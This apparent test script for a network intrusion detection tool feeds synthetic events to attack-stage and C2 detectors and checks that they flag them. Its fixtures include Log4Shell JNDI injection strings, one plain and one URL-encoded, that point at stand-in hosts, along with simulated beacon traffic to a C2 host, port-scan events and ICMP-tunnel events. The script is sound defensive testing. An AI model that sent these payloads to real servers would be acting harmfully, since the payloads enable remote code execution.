from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.attack_chain import detect_attack_stages
from src.correlation.c2_detector import detect_c2
from src.event.models import HttpEvent, NetworkEvent


def main() -> None:
    exploit = HttpEvent(
        event_id="evt-1",
        timestamp=1.0,
        src_ip="10.0.0.5",
        src_port=44444,
        dst_ip="10.0.0.10",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim",
        summary="jndi exploit",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="curl",
        headers={},
    )
    stages = detect_attack_stages([exploit], [{"event_id": "evt-1", "cve": "CVE-2021-44228", "score": 0.9}])
    assert any(stage["stage"] == "Exploitation" for stage in stages)

    encoded_exploit = HttpEvent(
        event_id="evt-encoded",
        timestamp=1.5,
        src_ip="10.0.0.5",
        src_port=44445,
        dst_ip="10.0.0.10",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /missing?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1",
        summary="encoded jndi exploit",
        method="GET",
        uri="/missing?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    encoded_stages = detect_attack_stages([encoded_exploit], [])
    assert any(stage["stage"] == "Exploitation" for stage in encoded_stages)

    beacon_events = [
        HttpEvent(
            event_id=f"beacon-{idx}",
            timestamp=float(idx * 30),
            src_ip="10.0.0.20",
            src_port=50000 + idx,
            dst_ip="8.8.8.8",
            dst_port=8080,
            protocol="HTTP",
            payload_clean="GET /api/checkin HTTP/1.1 Host: c2.example User-Agent: agent",
            summary="checkin",
            method="GET",
            uri="/api/checkin",
            host="c2.example",
            user_agent="agent",
            headers={},
        )
        for idx in range(5)
    ]
    findings = detect_c2(beacon_events)
    assert findings
    assert findings[0]["c2_type"] == "HTTP Beacon"

    normal_http_with_tcp_packets = [
        HttpEvent(
            event_id="http-1",
            timestamp=1.0,
            src_ip="127.0.0.1",
            src_port=50000,
            dst_ip="127.0.0.1",
            dst_port=18080,
            protocol="HTTP",
            payload_clean="GET / HTTP/1.1",
            summary="normal page",
            method="GET",
            uri="/",
            host="localhost",
            user_agent="curl",
            headers={},
            status_code=200,
        ),
        *[
            NetworkEvent(
                event_id=f"tcp-{idx}",
                timestamp=1.0 + idx / 1000,
                src_ip="127.0.0.1",
                src_port=18080,
                dst_ip="127.0.0.1",
                dst_port=50000 + idx,
                protocol="TCP",
                payload_clean="HTTP response packet",
                summary="HTTP response packet",
                raw_size=64,
            )
            for idx in range(4)
        ],
    ]
    assert not [finding for finding in detect_c2(normal_http_with_tcp_packets) if finding["c2_type"] == "TCP Beacon"]

    port_scan_events = [
        NetworkEvent(
            event_id=f"scan-{idx}",
            timestamp=float(idx),
            src_ip="10.0.0.50",
            src_port=45000 + idx,
            dst_ip="10.0.0.10",
            dst_port=1000 + idx,
            protocol="TCP",
            payload_clean="",
            summary="SYN scan",
            raw_size=0,
            tcp_flags="S",
        )
        for idx in range(12)
    ]
    port_scan = [finding for finding in detect_c2(port_scan_events, {"port_scan_min_ports": 10}) if finding["c2_type"] == "TCP Port Scan"]
    assert port_scan
    assert "distinct destination ports" in port_scan[0]["indicators"][0]

    icmp_events = [
        NetworkEvent(
            event_id=f"icmp-{idx}",
            timestamp=float(idx * 10),
            src_ip="10.0.0.60",
            src_port=None,
            dst_ip="198.51.100.60",
            dst_port=None,
            protocol="ICMP",
            payload_clean="A" * 128,
            summary="large icmp",
            raw_size=128,
        )
        for idx in range(6)
    ]
    icmp_findings = [finding for finding in detect_c2(icmp_events, {"icmp_min_events": 6}) if finding["c2_type"] == "ICMP Tunnel / Beacon"]
    assert icmp_findings
    assert "large repeated ICMP payloads" in icmp_findings[0]["indicators"]


if __name__ == "__main__":
    main()
